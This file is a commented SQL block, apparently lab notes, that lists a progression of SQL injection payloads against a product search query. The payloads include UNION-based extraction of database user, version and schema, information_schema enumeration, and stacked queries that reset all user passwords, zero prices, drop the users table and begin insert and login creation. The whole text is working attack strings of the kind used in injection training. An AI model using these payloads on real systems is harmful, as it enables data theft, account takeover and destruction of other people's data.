/*

SELECT * FROM products WHERE name LIKE '%'%'
SELECT * FROM products WHERE name LIKE '%%' order by 5;
SELECT * FROM products WHERE name LIKE '%%' union select 1,2,3,4,5 from users;
SELECT * FROM products WHERE name LIKE '%%' union select user(),version(),database(),@@GLOBAL.have_ssl,5 from users;
SELECT * FROM products WHERE name LIKE '%%'; select * from information_schema.tables;
SELECT * FROM products WHERE name LIKE '%%'; select * from information_schema.tables where table_schema='sqli';
SELECT * FROM products WHERE name LIKE '%%'; select * from orders;

SELECT * FROM products WHERE name LIKE '%%'; update users set password = 'password';
SELECT * FROM products WHERE name LIKE '%%'; update users set price = 0;
SELECT * FROM products WHERE name LIKE '%%'; drop table users;-- 
SELECT * FROM products WHERE name LIKE '%%'; insert into...
SELECT * FROM products WHERE name LIKE '%%'; create login...

*/